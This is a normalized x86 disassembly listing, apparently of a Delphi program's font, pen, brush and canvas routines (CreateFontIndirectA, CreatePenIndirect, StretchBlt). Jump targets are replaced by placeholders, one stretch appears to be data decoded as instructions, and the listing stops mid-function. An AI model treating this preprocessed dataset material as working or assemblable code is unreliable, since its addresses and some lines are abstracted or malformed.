push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41ba0c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41ba80
xor edx edx
push ebp
push sub_41bb6c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb73
mov eax [ ebp - 0x4 ]
call sub_41ba8c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407c70
test al al
je r-xdata
sub_41bb7c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba80
xor ecx ecx
push ebp
push sub_41bc03
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ba8c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41bc2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba80
xor eax eax
push ebp
push sub_41bc95
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ba98
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41bb7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc9c
mov eax [ ebp - 0x4 ]
call sub_41ba8c
retn
mov eax ebx
mov si 0xfffd
call sub_40348c
sub_41bca4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba80
xor eax eax
push ebp
push sub_41bd00
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd07
mov eax [ ebp - 0x4 ]
call sub_41ba8c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40348c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41bb7c
sub_41bd10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba80
xor edx edx
push ebp
push sub_41bd6f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd76
mov eax [ ebp - 0x4 ]
call sub_41ba8c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41bd7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413de0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41be19
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413a74
mov ebx eax
mov eax ebx
call sub_41d39c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41d7a0
mov eax [ rw-data ]
call sub_41bd10
mov eax [ rw-data ]
call sub_41bd10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be20
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413a74
call sub_41d654
inc esi
dec ebx
jne r-xdata
sub_41c46f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413524
retn
sub_41c4a0
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402dac
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b9c
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c554
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41ba98
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41c5a8
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bb7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41c5ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414030
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c2ac
xor eax eax
push ebp
push sub_41c6a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c2ac
xor eax eax
push ebp
push sub_41c68a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bca4
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c728
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c691
mov eax [ ebp - 0x8 ]
call sub_41c2bc
retn
mov eax ebx
call sub_41c9ac
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c9c8
sub_41c6d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c2ac
xor eax eax
push ebp
push sub_41c71d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bc2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c724
mov eax [ ebp - 0x4 ]
call sub_41c2bc
retn
sub_41c73c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41c8c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8cc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_404004
retn
mov eax [ rw-data ]
call sub_41ba80
xor eax eax
push ebp
push sub_41c89d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba8c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404244
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4085e0
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404244
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4085e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404244
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407da8
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41ca20
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41c8e4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41c4a0
mov edx esp
mov eax ebx
call sub_41c6d8
add esp 0x2c
pop esi
pop ebx
retn
sub_41c910
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c6c0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c6d8
add esp 0x2c
pop esi
pop ebx
retn
sub_41c950
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c6c0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402cac
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_40427c
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b9c
mov edx esp
mov eax ebx
call sub_41c6d8
sub_41c9c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_406118
mov edx eax
neg edx
mov eax ebx
call sub_41c910
pop esi
pop ebx
retn
sub_41c9f4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c6c0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c6d8
add esp 0x30
pop ebx
retn
sub_41ca28
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c6c0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41c6d8
add esp 0x2c
pop esi
pop ebx
retn
sub_41ca58
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c6c0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41c6d8
add esp 0x2c
pop esi
pop ebx
retn
sub_41ca80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41ba98
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41cac4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bb7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41caec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414030
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c2ac
xor eax eax
push ebp
push sub_41cb8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c2ac
xor eax eax
push ebp
push sub_41cb6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bca4
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41ccf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb75
mov eax [ ebp - 0x8 ]
call sub_41c2bc
retn
sub_41cba4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41cbbc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c2ac
xor eax eax
push ebp
push sub_41cc01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bc2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc08
mov eax [ ebp - 0x4 ]
call sub_41c2bc
retn
sub_41cc14
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cba4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cbbc
add esp 0x10
pop esi
pop ebx
retn
sub_41cc3c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41ba80
xor eax eax
push ebp
push sub_41ccc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba8c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c268
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41ccd4
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_41cbbc
add esp 0x10
pop edi
pop esi
retn
sub_41cd10
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cba4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41cbbc
add esp 0x10
pop esi
pop ebx
retn
sub_41cd40
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41cba4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41cbbc
sub_41cd6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41ba98
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41cdac
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bb7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41cdd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414030
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c2ac
xor eax eax
push ebp
push sub_41ce64
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c2ac
xor eax eax
push ebp
push sub_41ce47
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce4e
mov eax [ ebp - 0x8 ]
call sub_41c2bc
retn
sub_41ce7c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41ce98
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c2ac
xor eax eax
push ebp
push sub_41cedd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bc2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cee4
mov eax [ ebp - 0x4 ]
call sub_41c2bc
retn
sub_41cee8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41ce98
add esp 0x10
pop edi
pop esi
retn
sub_41cf14
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41ce7c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41ce98
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41cf48
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41ba80
xor edx edx
push ebp
push sub_41d015
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba8c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c268
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41d030
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41ce7c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41ce98
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41d064
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c554
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d9c8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca80
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d9e8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cd6c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41da08
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413d58
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41d128
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413df4
xor edx edx
mov eax esi
call sub_41d800
mov eax [ esi + 0xc ]
call sub_403290
mov eax [ esi + 0x10 ]
call sub_403290
mov eax [ esi + 0x14 ]
call sub_403290
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41d184
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d854
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d20c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov eax [ ebx + 0x14 ]
call sub_41cf0c
call sub_41c268
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c268
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
